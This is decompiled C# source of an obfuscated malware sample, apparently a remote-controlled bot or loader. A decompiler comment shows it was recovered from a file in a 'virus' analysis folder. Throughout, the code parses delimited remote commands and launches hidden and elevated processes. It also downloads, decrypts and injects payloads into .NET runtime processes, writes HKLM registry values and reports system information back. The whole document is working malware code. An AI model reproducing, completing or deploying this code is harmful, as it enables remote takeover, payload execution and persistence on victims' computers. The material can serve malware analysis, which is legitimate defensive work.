using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

[StandardModule]
internal sealed class _______________________________
{
	public static Mutex _;

	private static bool __;

	private static string ___;

	private static string ____;

	private static int _____;

	static _______________________________()
	{
		_______________________________.__ = false;
	}

	public static void _(string string_0)
	{
		unsafe
		{
			string[] strArrays = null;
			string[] strArrays1 = null;
			string[] strArrays2 = null;
			string[] strArrays3 = null;
			RegistryKey registryKey;
			int num = 0;
			string[] strArrays4;
			int _________ = 0;
			int num1 = 0;
			int num2 = 0;
			char[] chrArray;
			uint num3;
			object length;
			try
			{
				if (Operators.CompareString(string_0, <Module>.______<string>(1366899373), false) == 0)
				{
					length = sizeof(uint) + 5;
				}
				else if (Operators.CompareString(string_0, <Module>.____<string>(383612974), false) == 0)
				{
					length = sizeof(float) + -2;
				}
				else if (string_0.Contains(<Module>.______<string>(-1927356066)))
				{
					length = Type.EmptyTypes.Length + 3;
				}
				else if (!___________________________________________________________________.________())
				{
					return;
				}
				else if (string_0.Contains(<Module>.____<string>(-1452739546)))
				{
					if (~(-num & num) == num)
					{
						length = sizeof(double) + 1474038664;
					}
					else if (num2 * 17657856 == -5956)
					{
						length = Type.EmptyTypes.Length + -2128461909;
					}
					else
					{
						length = sizeof(ulong) + 3;
					}
				}
				else if (Operators.CompareString(string_0, <Module>.____<string>(-603040344), false) == 0)
				{
					length = sizeof(int) + -4;
				}
				else if (string_0.Contains(<Module>.______<string>(685941218)))
				{
					length = Type.EmptyTypes.Length + 6;
				}
				else if (string_0.Contains(<Module>._____<string>(-1608881628)))
				{
					chrArray = new char[] { '$' };
					strArrays1 = string_0.Split(chrArray);
					length = Type.EmptyTypes.Length + 12;
				}
				else if (string_0.Contains(<Module>._____<string>(-108318665)))
				{
					chrArray = new char[] { '$' };
					strArrays2 = string_0.Split(chrArray);
					num2 = 10865;
					if (Type.EmptyTypes.Length + -9153 != -9153)
					{
						_______________________________.___________();
						return;
					}
					_______________________________.____________(string.Concat(<Module>.______<string>(1353082456), strArrays2[1], <Module>.____<string>(1226113571), strArrays2[2]));
					num2 = checked((int)1222);
					length = Type.EmptyTypes.Length + 1;
				}
				else if (!string_0.Contains(<Module>._____<string>(-1300701384)))
				{
					return;
				}
				else
				{
					chrArray = new char[] { '$' };
					strArrays4 = string_0.Split(chrArray);
					_______________________________.____________(string.Concat(<Module>.____<string>(2035720178), strArrays4[1], <Module>.______<string>(851744222), strArrays4[2]));
					Thread.Sleep(10000);
					string str = <Module>._____<string>(-1188112787);
					try
					{
						str = (new SecurityIdentifier(<Module>.____<string>(-1333462296))).Translate(typeof(NTAccount)).ToString();
						if (str.Contains(<Module>.____<string>(-2143068903)))
						{
							string[] strArrays5 = Strings.Split(str, <Module>._____<string>(305124521), -1, CompareMethod.Binary);
							str = strArrays5[1].Trim();
						}
					}
					catch (Exception exception)
					{
						ProjectData.SetProjectError(exception);
						ProjectData.ClearProjectError();
					}
					string[] strArrays6 = new string[] { <Module>.___<string>(850792095), null, null, null, null };
					int num4 = 22859;
					if ((_________ & 3145728) != ((_________ ^ -716518593) & 3145728))
					{
						goto Label2;
					}
					strArrays6[1] = str;
					strArrays6[2] = <Module>._____<string>(1787231883);
					num4 = (((num1 ^ -num1) & 1) != 0 ? 867474525 : Type.EmptyTypes.Length + -21246);
					num3 = sizeof(float) + -4;
				Label10:
					switch (num3)
					{
						case 0:
						{
							do
							{
								strArrays6[3] = strArrays4[1];
								strArrays6[4] = <Module>.___<string>(1173350434);
								int num5 = num4;
								num4 = -5171;
								if (num5 != -21246)
								{
								}
								_______________________________.____________(string.Concat(strArrays6));
								_______________________________.____(string.Concat(<Module>.___<string>(-621270073), strArrays4[1], <Module>.______<string>(-42361521), strArrays4[2]));
							}
							while (num4 != -5171);
							goto Label3;
						}
						case 1:
						{
							Registry.LocalMachine.CreateSubKey(<Module>._______<string>(-33672434));
							registryKey = Registry.LocalMachine.OpenSubKey(<Module>._____<string>(-588258600), true);
							break;
						}
						default:
						{
							goto case 0;
						}
					}
					registryKey.SetValue(strArrays4[1], <Module>.______<string>(1522879322), RegistryValueKind.DWord);
					return;
				}
				while (true)
				{
					switch (length)
					{
						case 0:
						{
							_______________________________.______(true);
							return;
						}
						case 1:
						{
							_______________________________.____(string.Concat(<Module>.___<string>(-268808180), strArrays2[1], <Module>.______<string>(-1076601045), strArrays2[2]));
							if (num2 == -28720)
							{
								goto case 6;
							}
							return;
						}
						case 2:
						{
							_______________________________.___();
							return;
						}
						case 3:
						{
							if (!string_0.Contains(<Module>.______<string>(-606890507)))
							{
								goto case 14;
							}
							_______________________________.__ = true;
							goto case 14;
						}
						case 4:
						{
							return;
						}
						case 5:
						{
							_______________________________._____(strArrays3[1], <Module>.___<string>(1647031535), 3);
							length = Type.EmptyTypes.Length + 4;
							continue;
						}
						case 6:
						{
							chrArray = new char[] { '$' };
							strArrays3 = string_0.Split(chrArray);
							_________ = <Module>._________________;
							length = Type.EmptyTypes.Length + 5;
							continue;
						}
						case 7:
						{
							return;
						}
						case 8:
						{
							return;
						}
						case 9:
						{
							_______________________________.___________();
							return;
						}
						case 10:
						{
							_______________________________._____(strArrays[1], <Module>.______<string>(-300953722), 1);
							if (num2 == 25429)
							{
								if (16384 * ((33549024 & num2) - 9047) - -588709888 != (num2 ^ num2))
								{
									goto case 13;
								}
							}
							break;
						}
						case 11:
						{
							chrArray = new char[] { '$' };
							strArrays = string_0.Split(chrArray);
							num2 = (num2 * 805306368 - 4090 != 3691 ? 23390 : (int)(sizeof(ulong) + -1625651041));
							if (num2 / 524288 % 15 + 709376 != (794 & num2) - 3278 << 8)
							{
								length = sizeof(Guid) + -6;
								continue;
							}
							else
							{
								num1 = checked((int)-552962879);
								length = num1;
								continue;
							}
						}
						case 12:
						{
							_______________________________.____________(string.Concat(<Module>.______<string>(1353082456), strArrays1[1], <Module>._____<string>(-1496293031)));
							length = Type.EmptyTypes.Length + 13;
							continue;
						}
						case 13:
						{
							_______________________________.____(string.Concat(<Module>.___<string>(-2002819083), strArrays1[1]));
							length = Type.EmptyTypes.Length + 7;
							continue;
						}
						case 14:
						{
							(new Thread(new ThreadStart(_______________________________.__________))).Start();
							length = sizeof(byte) + 7;
							continue;
						}
						default:
						{
							_______________________________.___________();
							return;
						}
					}
				}
			}
			catch (Exception exception2)
			{
				ProjectData.SetProjectError(exception2);
				Exception exception1 = exception2;
				_______________________________.____(string.Concat(<Module>.___<string>(-822609204), exception1.ToString()));
				ProjectData.ClearProjectError();
			}
			return;
		Label2:
		Label3:
			registryKey = Registry.LocalMachine.OpenSubKey(<Module>._______<string>(-33672434), true);
			if (registryKey != null)
			{
				registryKey.SetValue(strArrays4[1], <Module>.______<string>(1522879322), RegistryValueKind.DWord);
				return;
			}
			num3 = sizeof(long) + -7;
			goto Label10;
		}
	}

	public static bool __()
	{
		bool flag = false;
		string str;
		try
		{
			str = (!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(<Module>._____<string>(705582770)) ? string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.System), <Module>._____<string>(-1507422977)) : string.Concat(Environment.GetEnvironmentVariable(<Module>._____<string>(124184184)), <Module>.____<string>(-1303028048)));
			flag = (!File.Exists(str) ? false : true);
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			_______________________________.____(string.Concat(<Module>._______<string>(-600768189), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	public static void ___()
	{
		try
		{
			string str = <Module>.____<string>(-1143658203);
			if (_______________________________.__())
			{
				str = <Module>._____<string>(724038371);
			}
			if (___________________________________________________________________.________())
			{
				str = string.Concat(str, <Module>.____<string>(-1750703335));
			}
			______________________________________________________________.___________(string.Concat(<Module>._____<string>(-438758801), str));
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			_______________________________.____(string.Concat(<Module>._______<string>(-381677997), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			______________________________________________________________.___________(string.Concat(<Module>.____<string>(404388875), string_0));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____(string string_0, string string_1, int int_0)
	{
		try
		{
			_______________________________.___ = string_0;
			_______________________________.____ = string_1;
			_______________________________._____ = int_0;
			(new Thread(new ThreadStart(_______________________________._______))).Start();
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			_______________________________.____(string.Concat(<Module>.____<string>(-1894856056), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(bool bool_0)
	{
		string str = null;
		string str1;
		string str2;
		int length = 0;
		object obj;
		try
		{
			int _______ = <Module>.____________;
			if ((536870912 & _______ * -536870912) == (_______ << 29 & 536870912))
			{
				if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(<Module>.___<string>(1980785605)))
				{
					goto Label1;
				}
				str2 = string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.System), <Module>.___<string>(1194939400));
				obj = sizeof(double) + -5;
			Label4:
				while (true)
				{
					switch (obj)
					{
						case 0:
						{
							goto Label2;
						}
						case 1:
						{
							while (true)
							{
								File.WriteAllText(str2, str);
								______________________._______ = -1749758540;
								str1 = <Module>._____<string>(1419880545);
								if (length == 27102)
								{
									break;
								}
							}
							_______________________________.____________(string.Concat(<Module>.______<string>(1049174922), str1, <Module>.______<string>(368216767), str1));
							if ((-2 | 2 * length) == -2)
							{
								obj = Type.EmptyTypes.Length + 0;
								continue;
							}
							else
							{
								obj = Type.EmptyTypes.Length + 1437967309;
								continue;
							}
						}
						case 2:
						case 3:
						{
							goto Label3;
						}
					}
				}
				goto Label3;
			}
		Label2:
			Thread.Sleep(5000);
			_______________________________.____________(<Module>.______<string>(-285107554));
			_______________________________.____________(<Module>._____<string>(1757646336));
			_______________________________.____________(<Module>.___<string>(-1829304859));
			_______________________________.____________(<Module>._____<string>(-305859612));
			_______________________________.____________(<Module>._____<string>(1663513340));
			if (bool_0)
			{
				_______________________________.____(<Module>._____<string>(-1937466773));
			}
		Label0:
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			_______________________________.____(string.Concat(<Module>._______<string>(1831932475), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label1:
		str2 = string.Concat(Environment.GetEnvironmentVariable(<Module>.____<string>(-695982916)), <Module>.___<string>(569333041));
	Label3:
		if (!File.Exists(str2))
		{
			goto Label0;
		}
		str = ___________________________________________________________________._(__________________________________________________________________________.___, Strings.StrReverse(<Module>.____<string>(-1735486211)));
		length = Type.EmptyTypes.Length + 27102;
		obj = Type.EmptyTypes.Length + 1;
		goto Label4;
	}

	public static void _______()
	{
		byte[] numArray;
		byte[] numArray1 = null;
		int num;
		int num1;
		string str = null;
		object length;
		try
		{
		Label9:
			if (Operators.CompareString(_______________________________.___, string.Empty, false) == 0)
			{
				return;
			}
		Label3:
			num = 26597;
		Label6:
			byte[] numArray2 = (new WebClient()).DownloadData(_______________________________.___);
			numArray = ___________________________________________________________________._______(numArray2, <Module>.___<string>(1387161447));
			num1 = num;
			num = -31315;
			if (num1 == 26597)
			{
				goto Label1;
			}
		Label8:
			if (_______________________________._____ == 1)
			{
				str = <Module>.______<string>(-6804603);
			}
			if (_______________________________._____ != 3)
			{
				goto Label2;
			}
			length = Type.EmptyTypes.Length + 2;
		Label14:
			switch (length)
			{
				case 0:
				{
					goto Label3;
				}
				case 1:
				{
					goto Label4;
				}
				case 2:
				{
					str = <Module>._______<string>(-397709995);
					break;
				}
				case 3:
				{
					goto Label5;
				}
				default:
				{
					goto Label6;
				}
			}
		Label2:
			if (Operators.ConditionalCompareObjectEqual(_______________________________._________(numArray1, str), true, false))
			{
				goto Label13;
			}
			_______________________________.____(<Module>.______<string>(954421114));
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			_______________________________.____(string.Concat(<Module>.____<string>(844045643), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label1:
		numArray1 = ________________________________________________________________________________.______(numArray);
		if (checked((int)numArray1.Length) != 1289728)
		{
			_______________________________.____(<Module>.______<string>(-1714143838));
			return;
		}
		else
		{
			num1 = num;
			num = 23914;
			if (num1 != -31315)
			{
				goto Label4;
			}
			_______________________________.____(string.Concat(_______________________________.____, <Module>._______<string>(-288164899)));
			str = <Module>.___<string>(409093195);
			if (num == 23914)
			{
				goto Label8;
			}
			goto Label9;
		}
	Label4:
		if (_______________________________._____ != 1)
		{
			return;
		}
		Thread.Sleep(30000);
		if (_______________________________.__())
		{
			goto Label11;
		}
		_______________________________.____(<Module>._______<string>(208126310));
		return;
	Label5:
		_______________________________.____(<Module>.____<string>(-157004885));
		if (C.bzA.Info.OSFullName.Contains(<Module>._______<string>(-233392351)))
		{
			if (num == -7578)
			{
				goto Label1;
			}
			_______________________________.______(false);
		}
		_______________________________.____________(<Module>._______<string>(1996250119));
		_______________________________.____________(<Module>.______<string>(-395642890));
		_______________________________.___();
		return;
	Label11:
		num = 22842;
		goto Label5;
	Label13:
		length = sizeof(long) + -7;
		goto Label14;
	}

	public static void ________()
	{
		// 
		// Current member / type: System.Void _______________________________::________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static object _________(byte[] byte_0, string string_0)
	{
		object obj;
		try
		{
			if (_______________________________________________________________________.___________(string.Concat(RuntimeEnvironment.GetRuntimeDirectory(), <Module>.____<string>(-1295829443)), string_0, byte_0, true, false, true))
			{
				switch (sizeof(float))
				{
					default:
					{
						obj = true;
						break;
					}
				}
			}
			else if (!_______________________________________________________________________.___________(string.Concat(RuntimeEnvironment.GetRuntimeDirectory(), <Module>.___<string>(692630896)), string_0, byte_0, true, false, true))
			{
				obj = (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, string_0, byte_0, true, false, true) ? false : true);
			}
			else
			{
				obj = true;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			obj = false;
			ProjectData.ClearProjectError();
		}
		<Module>.________ = obj;
		return obj;
	}

	public static void __________()
	{
		int num = 0;
		ProcessStartInfo processStartInfo;
		try
		{
			if (!___________________________________________________________________.________())
			{
				if (_________________________________________________._________())
				{
					______________________________________________________________.______________(<Module>.___<string>(1387161447), <Module>._____<string>(-215436598));
					_______________________________.____(<Module>.______<string>(-1408207053));
				}
				else
				{
					string str = <Module>._____<string>(1419880545);
					switch (Type.EmptyTypes.Length)
					{
						default:
						{
							processStartInfo = new ProcessStartInfo(<Module>.______<string>(168821456), string.Concat(<Module>.______<string>(-2089165208), str, _____________________________________________________________________________.__, str))
							{
								WindowStyle = ProcessWindowStyle.Hidden,
								UseShellExecute = true,
								WorkingDirectory = Environment.CurrentDirectory,
								Verb = <Module>._____<string>(2128613347)
							};
							break;
						}
					}
					while (true)
					{
						try
						{
							if ((num << 7) * 893 + (num << 7) * 131 != 1976100108)
							{
								Process.Start(processStartInfo);
								<Module>.______<string>(-1591756196);
								______________________________________________________________.__________________________.Close();
								sizeof(ulong) + 20543 == -19844;
							}
							______________________________________________________________.____________________________ = true;
							______________________________________________________________.__.Close();
							Thread.Sleep(60000);
							if (______________________________________________________________.____(______________________________________________________________.__________________))
							{
								ProjectData.EndApp();
							}
							______________________________________________________________.____________________________ = false;
							(new Thread(new ThreadStart(_____________________________________________________________________________.___))).Start();
							______________________________________________________________.______________(<Module>._______<string>(-1937358506), <Module>.______<string>(1524843933));
							break;
						}
						catch (Exception exception)
						{
							ProjectData.SetProjectError(exception);
							_______________________________.____(<Module>.___<string>(-1625887081));
							if (!_______________________________.__)
							{
								ProjectData.ClearProjectError();
								break;
							}
							else
							{
								ProjectData.ClearProjectError();
							}
						}
					}
				}
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			Exception exception1 = exception2;
			_______________________________.____(string.Concat(<Module>.____<string>(-498980218), exception1.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________()
	{
		ManagementObjectCollection.ManagementObjectEnumerator enumerator = null;
		try
		{
			int num = checked((int)48408);
			int ________ = <Module>._______________;
			string str = <Module>.__________(47111, num, ((________ + ________) / 7338 != -2059906234 ? (int)(sizeof(uint) + 214) : 1747943102));
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery(<Module>.____<string>(1656111992))))
			{
				enumerator = managementObjectSearcher.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject current = (ManagementObject)enumerator.Current;
					str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(str, current[<Module>.___<string>(673120577)]), <Module>._______<string>(-1599367774)));
				}
			}
			if (Operators.CompareString(str, <Module>.__________(Type.EmptyTypes.Length + 29547, ((________ / 5 & -1073741824) == 0 ? (int)(sizeof(uint) + 30035) : (int)(sizeof(long) + -212006864)), Type.EmptyTypes.Length + 42), false) != 0)
			{
				______________________________________________________________.___________(string.Concat(<Module>.______<string>(-1548340834), str));
			}
			else
			{
				______________________________________________________________.___________(<Module>.______<string>(-1534523917));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			_______________________________.____(string.Concat(<Module>.______<string>(-561445894), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________(string string_0)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(<Module>.____<string>(-1370275235), string.Concat(<Module>.____<string>(1785047589), string_0))
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true
			};
			Process.Start(processStartInfo);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}
}